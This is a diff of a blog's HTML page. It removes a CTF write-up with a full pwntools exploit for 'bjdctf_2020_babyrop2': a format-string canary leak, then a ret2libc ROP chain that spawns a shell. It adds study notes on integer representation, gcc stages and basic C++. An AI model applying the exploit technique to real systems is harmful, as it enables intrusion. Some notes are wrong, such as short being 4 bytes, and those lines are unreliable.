@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>bjdctf_2020_babyrop2 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" ROP , canary ">
-  <meta name="description" content="bjdctf_2020_babyrop2 | sixpar&#39;s blog">
+  <title>天问计划weeek9-day4 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" 天问计划 ">
+  <meta name="description" content="天问计划weeek9-day4 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -676,9 +676,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-bjdctf-2020-babyrop2" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-天问计划week9-day4" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">bjdctf_2020_babyrop2</h1>
+        <h1 class="article-title">天问计划weeek9-day4</h1>
     
     <div class="article-meta">
         
@@ -688,7 +688,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="PWN题">PWN题</a>
+            <a  data-rel="系列">系列</a>
             
         </span>
         
@@ -696,21 +696,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">ROP</a>
-            
-            <a class="color2">canary</a>
+            <a class="color5">天问计划</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-03 13:15:43'>2020-07-03 12:47</time>
+            Created At : <time class="date" title='Updated At: 2020-07-23 23:13:16'>2020-07-23 23:11</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:587</span>
+        <span>Count:1.4k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -740,7 +738,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制（64位）："><span class="toc-text">保护机制（64位）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路："><span class="toc-text">利用思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整exp："><span class="toc-text">完整exp：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#C-课程："><span class="toc-text">C++课程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#心得："><span class="toc-text">心得：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -756,58 +754,46 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="保护机制（64位）："><a href="#保护机制（64位）：" class="headerlink" title="保护机制（64位）："></a>保护机制（64位）：</h2><blockquote>
-<p>  Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)</p>
-</blockquote>
-<p>可见比babyrop1那题多一个canary的保护机制。</p>
-<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>通过格式化漏洞泄露canary，然后溢出通过puts函数的rop链泄露libc地址，再次溢出rop执行getshell</p>
-<p>本题的第一个输入只允许输入6个字节，__isoc99_scanf(“%6s”, &amp;format);    所以输出也是6个字节。<br>所以我们就就一个一个偏移试过去，aa%1$p 、aa%2$p ……</p>
-<p>当输入  aa%6$p 时，得到 aa0x702436256161  ，可见我们输入的内容在偏移6上，所以格式化字符串的偏移是6</p>
-<p>而canary的值是var_8变量，处在 rbp-0x8 的位置，我们要计算偏移。我们输入的format变量位于 ebp-0x10 的位置，所以偏移就是 0x8 </p>
-<p>所以我们尝试直接在第一个输入处输入 %7$p ，输出来的16字节数据一定是canary的值没错了。</p>
-<p>接收canary的值 ：</p>
-<pre><code class="python">p.recvuntil(&#39;0x&#39;)
-canary=int(p.recv(16),16)</code></pre>
-<p>一般canary的位置都在 ebp-8 的位置。所以我们后续溢出的时候把canary的值填回去就能绕过检查了，</p>
-<p>具体操作：</p>
-<blockquote>
-<p>payload=’a’*0x18+p64(canary)+p64(0xdeadbeef)+ …….</p>
-</blockquote>
-<p>然后后续操作就跟 babyrop1 一样了。</p>
-<p>对了，本题踩的坑：  在泄露puts地址时，要加上 p.recv()  表示全部接收完。要不然puts地址数据会丢失  （调试得puts的地址为 0xa ，显然不对啊），导致后续操作都出错了。要不是我把puts地址给打印出来看看，我还不知道错在哪里呢  QAQ</p>
-<h2 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h2><pre><code class="python">#coding:utf-8
-from pwn import *
-p=process(&#39;./bjdctf_2020_babyrop2&#39;)
-# p=remote(&#39;node3.buuoj.cn&#39;,28226)
-elf=ELF(&#39;./bjdctf_2020_babyrop2&#39;)
-libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
-
-p.recvuntil(&#39;give u some gift to help u!&#39;)
-p.sendline(&#39;%7$p&#39;)
-p.recvuntil(&#39;0x&#39;)
-canary=int(p.recv(16),16)
-print &quot;canary is &quot;+hex(canary)
-
-pop_rdi=0x400993
-puts_plt=elf.plt[&#39;puts&#39;]
-puts_got=elf.got[&#39;puts&#39;]
-vuln_addr=0x0400887
-
-payload1=&#39;a&#39;*0x18+p64(canary)+p64(0xdeadbeef)+p64(pop_rdi)+p64(puts_got)
-payload1+=p64(puts_plt)+p64(vuln_addr)
-p.recvuntil(&#39;me u story!&#39;)
-p.sendline(payload1)
-p.recv() 
-puts_addr = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
-print &quot;puts_addr is &quot;+hex(puts_addr)
-
-libc_base= puts_addr - libc.symbols[&#39;puts&#39;]
-system_addr=libc_base + libc.symbols[&#39;system&#39;]
-binsh_addr= libc_base+ libc.search(&quot;/bin/sh\x00&quot;).next()
-
-payload2=&#39;a&#39;*0x18 +p64(canary)+&#39;b&#39;*8+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
-p.sendline(payload2)
-p.interactive()</code></pre>
+        <p>带符号整数是符号扩展，若符号位是1则全部扩展为1就是开头全变为FF….，而无符号整数是0扩展。</p>
+<pre><code class="c">short si=-32768    （16位）
+unsigned short usi=si   （16位）
+int i=si    （32位）
+unsigned ui=usi    （32位）
+则：
+    //十进制   十六进制
+si=  -32768    80 00
+usi=32768     80 00
+i=   -32768   FF FF 80 00    （符号扩展）
+ui=   32768   00 00 80 00    （0扩展）</code></pre>
+<p>但为什么32768的机器数是80 00呢？因为32768= 2的15次方，所以1后面15个0，所以就是 80 00</p>
+<p>例2：</p>
+<pre><code class="c">int i=32768
+short si=(short) i
+int j = si
+则一开始i=32768，机器数为 00 00 80 00
+si= -32768  机器数为 80 00    （32位转为16位发生了截断，高位被截断）
+j= -32768 ，机器数为FF FF 80 00，符号扩展，符号位为1，故扩展出来为FF，补满32位</code></pre>
+<p>当截断的时候发生了溢出！因为80 00超出了16位能表示的最大范围，最大的是32767（0111111111111111），而32768，即80 00最高位是1，使得必须增加1位高位作为符号位，故溢出了。所以就成了最小的负数了。所以表示为 -32768 。另外负数是用补码表示的（符号位不变，其余位取反，然后+1）， 所以16位的范围就是 32767~ -32768</p>
+<p>若n=8，计算107+46？ 107的二进制为0110 1011  ，46的二进制为0010 1110<br>则两个二进制相加，</p>
+<pre><code class="c">   0110 1011
++  0010 1110
+= 01001 1001</code></pre>
+<p>可见溢出了，所以 溢出标志OF=1 ，符号标志SF=1，进位标志CF=0，零标志ZF=0<br>两个正数相加得到负数，故溢出！OF=1<br>无符号时：sum=153，因为CF=0，所以未发生溢出，结果正确<br>带符号时：sum=-103，因为OF=1，所以发生溢出，结果错误！</p>
+<p>无符号整数减法：当借位时即CF=1，发生溢出，即比减数要小<br>带符号整数减法：看OF，当OF=SF时才不会发生溢出</p>
+<p>关于无符号整数和带符号整数的讨论先学习到这（P29）。（没兴趣呢）<br>现在从P35开始看</p>
+<p>一步到位： gcc -O1 main.c test.c -o test     ，O1表示一级优化<br>gcc -E test.c -o test.i   得到预处理结果<br>gcc -S test.i -o test.s   预处理结果文件通过编译得到汇编文件<br>也可以直接对源程序编译： gcc -S test.c -o test.s<br>gcc -c test.s -o test.o 汇编之后将得到可重定位的二进制文件，01序列，此时不能直接查看，我们必须 objdump -d test.o 这样反汇编来查看。</p>
+<p>test.o是可重定位的目标文件，test是可执行目标文件。前者的代码地址都是从0开始（文件内偏移），而后者的地址是确切的虚拟地址，比如是从80483d4开始的。</p>
+<p>指令集体系结构（ISA），是可执行指令的集合，是处于软件和硬件交界处。是一种规约，规定了软件如何使用硬件，是硬件的一种抽象。不同的指令集：如IA-32、MIPS、ARM</p>
+<p>现在Intel把32位x86架构的名称x86-32改为 IA-32<br>寻址方式：1.立即寻址（直接给出立即数）；2.寄存器寻址（存在寄存器里）；3.剩下的都是存储器寻址（存在存储空间中）。<br>6个段寄存器都是16位的，是指针，由段寄存器（间接）确定操作数所在段的段基址<br>然后有效地址给出操作数在所在段的偏移地址</p>
+<p>乘法指令mul：若只给出了一个操作数，则另一个操作数在寄存器al、ax、eax中。将操作数和累加器中的内容相乘，然后重新存放到寄存器al/ax/eax中。<br>在AT&amp;T指令中，mulb表示8位的乘法，mulw是16位，而这些都是无符号整数乘法<br>而imulb指的是带符号整数的乘法。</p>
+<p>0xB4 先转换为二进制： 1011 0100 ，然后首位符号位是1所以转换为负号，剩下的各位取反，得到 100 1011 ，然后再+1，得到 100 1100 ，转换为十进制得到 -76 （带上负号） </p>
+<p>逻辑运算：not，and，or，xor，test  仅not不影响标志寄存器，其他指令OF=CF=0，而ZF和SF则根据结果设置。若全0，则ZF=1，若最高位为1，则SF=1<br>test：进行相与操作</p>
+<p>带符号整数是算术移位，无符号整数是逻辑移位<br>看到P49 ，歇一会</p>
+<h2 id="C-课程："><a href="#C-课程：" class="headerlink" title="C++课程："></a>C++课程：</h2><p>为了区分c标准库和C++标准库，c中include的文件都是 .h后缀，而C++标准库则不需要，例如iostream</p>
+<p>创建header file 默认的第一行是“#pragma once”，它是头文件保护符，目的是为了不重复包含，即只include一次。以前头文件保护符老的写法是： 在开头是 #ifndef xxx ，中间是文件体，然后末尾是 #endif，如果之前没有include过xxx文件，则执行该文件体。</p>
+<p>关于变量，变量类型都不是绝对的，主要看程序员对数据的判断了。例如 令 char x=65，则打印出来的是A而不是65.</p>
+<p>int（带符号整数）是4字节，32位，其最大是2的31次方，因为最高位是符号位不算在内。 而unsigned int （无符号整数）最大则是2的32次方，它没有符号位之说。<br>char是1字节， bool的结果是0或1，也是1字节（实际只需要1位即可），short是4字节。</p>
+<h2 id="心得："><a href="#心得：" class="headerlink" title="心得："></a>心得：</h2><p>感觉照着这进度看下去，根本来不及在本周内看完全部视频噢。<br>还要做 lab实验。<br>接下来几天必须抓紧时间看了！</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
